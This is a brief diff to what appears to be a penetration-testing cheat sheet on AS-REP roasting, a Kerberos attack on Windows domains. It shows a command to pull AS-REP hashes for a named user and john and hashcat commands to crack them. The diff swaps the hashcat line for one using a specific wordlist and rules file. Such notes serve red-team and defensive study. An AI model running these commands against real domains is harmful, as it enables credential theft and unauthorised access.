@@ -8,4 +8,4 @@ On Windows:
 `Get-ASREPHash -Username someuser123 -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)`   
 Cracking:   
 `john --wordlist=passwords_kerb.txt hashes.asreproast`   
-`hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt`   
+`hashcat --attack-mode 0 --hash-type 18200 hashes.asreproast /srv/wordlists/uncompressed/crackstation-human-only.txt --rules-file /srv/rules/nsa_500.txt`   
